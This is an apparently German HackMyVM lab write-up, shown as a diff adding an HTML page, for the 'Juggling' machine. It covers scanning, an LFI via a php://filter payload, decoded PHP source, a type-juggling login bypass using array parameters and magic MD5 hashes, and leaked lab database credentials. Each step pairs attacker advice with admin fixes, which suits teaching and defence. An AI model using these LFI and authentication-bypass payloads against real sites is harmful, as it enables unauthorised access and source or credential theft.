@@ -1,0 +1,643 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Juggling - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Juggling - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">gobuster</div>
+                 <div class="tool-item">Browser (Firefox)</div>
+                 <div class="tool-item">base64</div>
+                 <div class="tool-item">CyberChef (external)</div>
+                 <div class="tool-item">Burp Suite</div>
+                 <div class="tool-item">nc (netcat)</div>
+                 <div class="tool-item">python3</div>
+                 <div class="tool-item">stty</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">wget</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">mkdir (implizit)</div>
+                 <div class="tool-item">msfconsole</div>
+                 <div class="tool-item">Metasploit (local_exploit_suggester)</div>
+                 <div class="tool-item">Metasploit (cve_2022_0847_dirtypipe)</div>
+                 <div class="tool-item">id</div>
+                 <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#lfi-code-analysis">LFI & Code Analysis</a></li>
+                <li><a href="#php-logic-bypass">PHP Logic Bypass & VHost Discovery</a></li>
+                <li><a href="#proof-of-concept-rce">Proof of Concept (SSRF/RCE via Hidden VHost)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> rehan)</a></li>
+                <li><a href="#proof-of-concept-pyhijack">Proof of Concept (PYTHONPATH Hijacking)</a></li>
+                <li><a href="#privilege-escalation-rehan">Privilege Escalation (rehan -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.148	08:00:27:c4:28:78	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment mittels ARP-Anfragen zu identifizieren.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.148` wird gefunden. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.148` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	 localhost
+<span class="command">192.168.2.148    juggling.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Die lokale `/etc/hosts`-Datei des Angreifers wird angezeigt. Sie enthält einen Eintrag, der der Ziel-IP `192.168.2.148` den Hostnamen `juggling.hmv` zuweist.</p>
+             <p class="evaluation">**Bewertung:** Erleichtert die Ansprache des Ziels in späteren Befehlen und ist notwendig, falls der Webserver Virtual Hosting verwendet.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `juggling.hmv` in nachfolgenden Scans und Zugriffen.<br>**Empfehlung (Admin):** Keine Aktion auf dem Zielsystem erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.148 -p-</span></div>
+                     <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-14 00:56 CEST
+Nmap scan report for juggling.hmv (192.168.2.148)
+Host is up (0.00015s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
+|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
+|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-title: Juggling
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set <span class="password"><-- HttpOnly nicht gesetzt (geringes Risiko hier)</span>
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:C4:28:78 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.3
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms juggling.hmv (192.168.2.148)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) wird auf `juggling.hmv` (192.168.2.148) durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Zwei offene TCP-Ports werden gefunden:
+*   **Port 22 (SSH):** OpenSSH 8.4p1 auf Debian 11. Standard-Fernzugriff, aktuelle Version.
+*   **Port 80 (HTTP):** Nginx 1.18.0. Der Titel der Seite ist "Juggling". Das Nmap-Skript `http-cookie-flags` stellt fest, dass das `HttpOnly`-Flag für das `PHPSESSID`-Cookie nicht gesetzt ist. Dies könnte theoretisch Cross-Site Scripting (XSS) erleichtern, ist aber meist von geringerer Priorität.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Webanwendung auf Port 80 intensiv (Gobuster, Nikto, manuelle Analyse). Das fehlende `HttpOnly`-Flag ist ein nachrangiger Befund.<br>**Empfehlung (Admin):** Setzen Sie das `HttpOnly`-Flag für Session-Cookies in der PHP- oder Nginx-Konfiguration, um das Risiko des Cookie-Diebstahls durch XSS zu verringern. Halten Sie Nginx und PHP aktuell.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~] <span class="comment"><-- Anderer Prompt --></span>
+└─# <span class="command">gobuster dir -r -u http://juggling.hmv/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,bak,7z,zip,py,sql,txt,xml -e | grep -i 200</span></div>
+                     <pre>
+<span class="command">http://juggling.hmv/admin.php</span>            (Status: 200) [Size: 2485]
+<span class="command">http://juggling.hmv/blog.php</span>             (Status: 200) [Size: 0]
+<span class="command">http://juggling.hmv/index.php</span>            (Status: 200) [Size: 2485]
+<span class="command">http://juggling.hmv/logout.php</span>           (Status: 200) [Size: 2485]
+<span class="command">http://juggling.hmv/test.php</span>             (Status: 200) [Size: 32]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um nach Verzeichnissen und Dateien zu suchen, die mit den gängigen PHP-Dateiendungen enden. Die Ausgabe wird gefiltert, um nur Ergebnisse mit Status 200 anzuzeigen. `-r` folgt Weiterleitungen.</p>
+             <p class="evaluation">**Bewertung:** Mehrere interessante PHP-Dateien werden gefunden: `admin.php`, `blog.php`, `index.php`, `logout.php` und `test.php`. `blog.php` hat die Größe 0, ist aber vorhanden. `test.php` ist oft ein Überbleibsel aus der Entwicklung und könnte Schwachstellen oder Informationen enthalten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie alle gefundenen PHP-Seiten manuell im Browser und mit Burp Suite. Achten Sie besonders auf `blog.php` (warum leer? Nimmt es Parameter?) und `test.php` (Funktionalität?).<br>**Empfehlung (Admin):** Entfernen Sie unnötige Test-Dateien wie `test.php`. Stellen Sie sicher, dass alle PHP-Skripte sicher sind und keine Schwachstellen enthalten.</p>
+        </section>
+
+        <section id="lfi-code-analysis">
+             <h2>LFI & Code Analysis</h2>
+             <p class="analysis">**Analyse:** Untersuchung der `blog.php`-Seite führt zur Entdeckung einer Local File Inclusion (LFI)-Schwachstelle, die genutzt wird, um den Quellcode anderer PHP-Dateien auszulesen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Firefox / Inspector / Form: blog.php?page=test
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                     <pre><span class="command">http://juggling.hmv/blog.php?page=php://filter/read=convert.base64-encode/resource=index</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Die Notiz deutet darauf hin, dass die Seite `blog.php` einen Parameter `page` akzeptiert. Durch Übergabe von `test` wird vermutlich `test.php` eingebunden. Anschließend wird die PHP-Wrapper-Funktion `php://filter` verwendet, um eine LFI auszunutzen. Der Payload `php://filter/read=convert.base64-encode/resource=index` weist PHP an, die Datei `index` (was zu `index.php` aufgelöst wird) zu lesen, ihren Inhalt Base64 zu kodieren und dann auszugeben.</p>
+             <p class="evaluation">**Bewertung:** Eine klassische LFI-Schwachstelle im `page`-Parameter von `blog.php` wurde gefunden und erfolgreich ausgenutzt. Dies ermöglicht das Auslesen des Quellcodes beliebiger PHP-Dateien (und potenziell anderer Dateien, auf die der Webserver Zugriff hat).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Nutzen Sie die LFI, um den Quellcode aller relevanten PHP-Dateien (`index.php`, `admin.php`, `test.php`, `sqldb_config.php` falls vorhanden) auszulesen und nach weiteren Schwachstellen, Logikfehlern oder Credentials zu suchen.<br>**Empfehlung (Admin):** Beheben Sie die LFI-Schwachstelle in `blog.php` dringend! Validieren Sie den `page`-Parameter strikt gegen eine Whitelist erlaubter Dateien oder entfernen Sie die Funktionalität, wenn sie nicht benötigt wird. Vermeiden Sie die Verwendung von Benutzereingaben in Dateioperationsfunktionen wie `include`, `require`, `file_get_contents` ohne sorgfältige Validierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment">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YwMCIgaGVpZ2h0PSI1MDAiIGF1dG9wbGF5IGxvb3AgbXV0ZWQ+CgkJCQkJCQkJPHNvdXJjZSBzcmM9ImltYWdlcy9qdWdnbGUubXA0IiB0eXBlPSJ2aWRlby9tcDQiIC8+CgkJCQkJCQk8L3ZpZGVvPgoJCQkJCQkJPGRpdiBjbGFzcz0ibG9naW4td3JhcCBwLTQgcC1tZC01Ij4KCQkJCQkJCQk8ZGl2IGNsYXNzPSJkLWZsZXgiPgoJCQkJCQkJCQk8ZGl2IGNsYXNzPSJ3LTEwMCI+CgkJCQkJCQkJCQk8aDMgY2xhc3M9Im1iLTUiPlNpZ24gSW48L2gzPgoJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkKCQkJCQkJCQk8Zm9ybSBub3RhY3Rpb249ImJsb2cucGhwP3BhZ2U9dGVzdCIgY2xhc3M9InNpZ25pbi1mb3JtIiBtZXRob2Q9IlBPU1QiPgoJCQkJCQkJCQk8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIG1iLTIiPgoJCQkJCQkJCQkJPGxhYmVsIGNsYXNzPSJsYWJlbCI+VXNlcm5hbWU8L2xhYmVsPgoJCQkJCQkJCQkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iVXNlcm5hbWUiIHJlcXVpcmVkPgoJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJCgkJCQkJCQkJCTxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgbWItNCI+CgkJCQkJCQkJCQk8bGFiZWwgY2xhc3M9ImxhYmVsIj5QYXNzd29yZDwvbGFiZWw+CgkJCQkJCQkJCQk8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiIHJlcXVpcmVkIHBhdHRlcm49Iig/PS4qW2Etel0pKD89LipbQS1aXSkoPz0uKlswLTldKS57CwxNX0iPgoJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQkJCgkJCQkJCQkJCTxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgCQkJCQkJCQkJCTxkaXYgY2xhc3M9InJvdyBqdXN0aWZ5LWNvbnRlbnQtbWQtY2VudGVyIj4KCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb2wgY29sLWxnLTUiPgoJCQkJCQkJCQkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idmFsMSIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9IlZhbHVlIDEiPgoJCQkJCQkJCQkJCTwvZGl2PgoKCQkJCQkJCQkJCQk8ZGl2IGNsYXNzPSJjb2wgY29sLWxnLTUiPgoJCQkJCQkJCQkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idmFsMiIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9IlZhbHVlIDIiPgoJCQkJCQkJCQkJCTwvZGl2PgoJCQkJCQkJCQkJPC9kaXY+CgkJCQkJCQkJCTwvZGl2PgoKCQkJCQkJCQkJPGRpdiBjbGFzcz0ibXQtNSI+CgkJCQkJCQkJCQk8YnV0dG9uIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiBjbGFzcz0iZm9ybS1jb250cm9sIGJ0biBidG4tcHJpbWFyeSByb3VuZGVkIHN1Ym1pdCI+U2lnbiBJbjwvYnV0dG9uPgoJCQkJCQkJCQk8L2Rpdj4KCQkJCQkJCQk8L2Zvcm0+CgkJCQkJCQk8L2Rpdj4KCQkJCQkJPC9kaXY+CgkJCQkJPC9kaXY+CgkJCQk8L2Rpdj4KCQkJPC9kaXY+CgkJPC9zZWN0aW9uPgoKCQk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5Lm1pbi5qcyI+PC9zY3JpcHQ+CgkJPHNjcmlwdCBzcmM9ImpzL3BvcHBlci5qcyI+PC9zY3JpcHQ+CgkJPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgoJCTxzY3JpcHQgc3JjPSJqcy9tYWluLmpzIj48L3NjcmlwdD4KCTwvYm9keT4KPC9odG1sPgo=</span></pre>
+                     <pre><span class="comment">------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[Link: CyberChef | Ziel: https://gchq.github.io/CyberChef/#recipe=From_Base64] <span class="comment"><-- Tool zur Dekodierung --></span>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Base64-kodierte Quellcode der `index.php` (erhalten über die LFI in `blog.php`) wird angezeigt. Ein Link zu CyberChef wird angegeben, um den Code zu dekodieren.</p>
+             <p class="evaluation">**Bewertung:** Zeigt den Quellcode, der nun analysiert werden muss.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<?php
+	session_start();
+	require_once("sqldb_config.php"); <span class="password"><-- Lädt DB Config --></span>
+
+	if(isset($_SESSION['username'])) {
+        	header("Location: admin.php");
+        	die();
+    	}
+
+	if (isset($_POST['submit'])) {
+		$username = $_POST['username'];
+		$password = $_POST['password'];
+		$val1 = $_POST['val1'];
+		$val2 = $_POST['val2'];
+
+		$magicval = strcasecmp($val1,$val2); <span class="password"><-- Vergleicht val1 & val2 case-insensitive --></span>
+		$key = md5("$username".$password); <span class="password"><-- Erzeugt MD5 Key --></span>
+
+		if (empty($val1) && empty($val2)) { <span class="comment">//Fehler, sollte || (OR) sein!</span>
+			echo '<br><h1 style="text-align:center;color:red;"> Value 1 and Value2 can\'t be Empty </h1>';
+			header("Refresh:3");
+		} else {
+			if ($val1 === $val2) { <span class="comment">//Prüft auf Identität</span>
+				echo '<br><h1 style="text-align:center;color:red;"> Value 1 and Value2 can\'t be Same </h1>';
+				header("Refresh:3");
+			} else {
+				if ($key == number_format($magicval * 1337)) { <span class="password"><-- Kritische Bedingung! --></span>
+					$_SESSION['username'] = "ryan";
+					header("Location: admin.php"); die();
+					# header("Location: http://s3cur3.juggling.hmv/index.php"); <span class="password"><-- VHost Hinweis! --></span>
+					header("Location: ../s3cur3/index.php"); <span class="password"><-- SSRF/LFI? --></span>
+				} else {
+					header("Refresh:3");
+				}
+			}
+		}
+	}
+?>
+[...] <span class="comment">(Rest ist HTML)</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der dekodierte PHP-Code der `index.php` wird analysiert:
+1.  Lädt eine `sqldb_config.php`.
+2.  Nimmt `username`, `password`, `val1`, `val2` via POST entgegen.
+3.  Berechnet `$magicval` mittels `strcasecmp($val1, $val2)`. Wichtig: `strcasecmp` gibt `0` zurück, wenn die Strings gleich sind (ohne Berücksichtigung der Groß-/Kleinschreibung), oder einen anderen Wert sonst. Wenn Arrays statt Strings übergeben werden (was PHP bei Parametern wie `val1[]=a` erlaubt), gibt `strcasecmp` `null` zurück.
+4.  Berechnet `$key = md5($username . $password)`.
+5.  Prüft auf leere `val1` *und* `val2` (Logikfehler, sollte `||` sein).
+6.  Prüft, ob `val1` und `val2` *exakt* identisch sind (`===`).
+7.  **Kritische Bedingung:** Prüft, ob `$key == number_format($magicval * 1337)`. Hier passiert Folgendes:
+    *   Wenn `$val1` und `$val2` Arrays sind, ist `$magicval` `null`.
+    *   `null * 1337` ergibt `0`.
+    *   `number_format(0)` ergibt `"0"` (String).
+    *   Die Bedingung wird zu `$key == "0"`. PHP führt hier einen Typvergleich durch (`==`, nicht `===`). Ein MD5-Hash ist ein String. PHP betrachtet einen String, der nicht numerisch beginnt, im numerischen Vergleich als `0`. Daher wird diese Bedingung wahr, wenn der MD5-Hash von `$username.$password` mit einer Zahl beginnt *oder* wenn er keine Zahl am Anfang hat (z.B. "a...", "b...", etc.). Es gibt bekannte MD5-Strings, die mit `0e` beginnen und von PHP als `0` interpretiert werden (z.B. `md5('240610708')` -> `0e462097431906509019562988736854`).
+8.  Wenn die Bedingung wahr ist, wird die Session gesetzt und zu `admin.php` weitergeleitet. Es gibt auskommentierte `header`-Zeilen, die auf einen VHost `s3cur3.juggling.hmv` und einen relativen Pfad `../s3cur3/index.php` hinweisen.</p>
+              <p class="evaluation">**Bewertung:** Eine komplexe, aber ausnutzbare PHP-Typvergleichsschwäche (Type Juggling). Durch Senden von `val1` und `val2` als Arrays (z.B. `val1[]=a&val2[]=A`) wird `$magicval` zu `null`. Die Bedingung wird dann zu `$key == "0"`. Man muss nun einen `username` und `password` finden, deren verknüpfter MD5-Hash von PHP als `0` interpretiert wird (beginnt nicht numerisch oder ist eine "Magic Hash" wie `0e...`). Die auskommentierten Header liefern zudem den Hinweis auf den VHost `s3cur3.juggling.hmv`.</p>
+              <p class="recommendation">**Empfehlung (Pentester):**
+    1.  Fügen Sie `192.168.2.148 s3cur3.juggling.hmv` zu `/etc/hosts` hinzu.
+    2.  Finden Sie eine Kombination aus `username` und `password`, deren MD5-Hash von PHP als `0` interpretiert wird. Gängige "Magic Hashes" wie `md5('240610708')` (ergibt `0e...`) sind ein guter Startpunkt. Testen Sie z.B. `username=QNKCD` und `password=Z`, da `md5('QNKCDZ')` `0e830400451993494058024219903391` ergibt.
+    3.  Senden Sie einen POST-Request an `index.php` mit `username=QNKCD`, `password=Z`, `val1[]=a`, `val2[]=A`.
+    4.  Folgen Sie der Weiterleitung zu `admin.php` oder untersuchen Sie den VHost `s3cur3.juggling.hmv`.<br>
+**Empfehlung (Admin):** Beheben Sie die PHP-Logik:
+    *   Verwenden Sie strikte Vergleiche (`===`) anstelle von losen (`==`), insbesondere bei Authentifizierungsprüfungen.
+    *   Validieren Sie Eingabetypen (stellen Sie sicher, dass `val1` und `val2` Strings sind, keine Arrays).
+    *   Verwenden Sie sicherere Passwort-Hashing-Algorithmen (bcrypt, Argon2).</p>
+         </section>
+
+         <section id="php-logic-bypass">
+             <h2>PHP Logic Bypass & VHost Discovery</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">s3cur3.juggling.hmv</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Notiz des gefundenen VHosts.</p>
+             <p class="evaluation">**Bewertung:** Ziel für weitere Untersuchung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment"><?php
+    $servername = "localhost";
+    $username = "juggler";
+    $password = "juggler#2021";
+    $dbname = "jugglingdb";
+
+    $conn = mysqli_connect($servername, $username, $password, $dbname);
+
+    // if ($conn) {
+    //    echo "Connection Successful";
+    // } else {
+    //    echo "Connection failed";
+    // }
+?></span></pre>
+                 </div>
+            </div>
+              <p class="analysis">**Analyse:** Der Inhalt der Datei `sqldb_config.php` (ausgelesen via LFI, impliziert).</p>
+              <p class="evaluation">**Bewertung:** Enthüllt MySQL-Datenbank-Credentials: Benutzer `juggler`, Passwort `juggler#2021`, Datenbank `jugglingdb`. Diese sind für den aktuellen Exploit nicht direkt relevant, aber nützliche Informationen.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die DB-Credentials für spätere Verwendung, falls ein Datenbankzugriff möglich wird.<br>**Empfehlung (Admin):** Beschränken Sie Leserechte auf Konfigurationsdateien.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://s3cur3.juggling.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x [...] -t 100 -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+[...]
+<span class="command">http://s3cur3.juggling.hmv/index.php</span>            (Status: 302) [Size: 0] [--> http://juggling.hmv/] <span class="password"><-- Leitet zurück! --></span>
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird auf den neu entdeckten VHost `s3cur3.juggling.hmv` angesetzt.</p>
+             <p class="evaluation">**Bewertung:** Findet eine `index.php`, die aber sofort zurück zur Hauptseite `juggling.hmv` weiterleitet. Dieser VHost scheint selbst keine direkte Angriffsfläche zu bieten, aber die Weiterleitung in der `index.php` (Main) zu diesem VHost (`../s3cur3/index.php`) könnte relevant sein.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Weiterleitung `header("Location: ../s3cur3/index.php");` in der Haupt-`index.php` nach erfolgreichem Login-Bypass ist der Schlüssel. Es handelt sich wahrscheinlich um eine **Server-Side Request Forgery (SSRF)** oder RCE-Schwachstelle, da der `Location`-Header potenziell manipuliert werden könnte, oder `../s3cur3/index.php` selbst ist verwundbar. Untersuchen Sie die POST-Anfrage an die Haupt-`index.php` genauer mit Burp Suite.<br>**Empfehlung (Admin):** Vermeiden Sie relative Pfade in `Location`-Headern, wenn möglich. Validieren Sie alle Werte, die in Header geschrieben werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">GET /blog.php?page=php://filter/read=convert.base64-encode/resource=..%2fs3cur3%2findex HTTP/1.1 <span class="comment"><-- LFI auf s3cur3/index.php --></span>
+[...]</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Erneuter LFI-Versuch über `blog.php`, diesmal um den Quellcode von `../s3cur3/index.php` (relativ zu `blog.php`) zu lesen.</p>
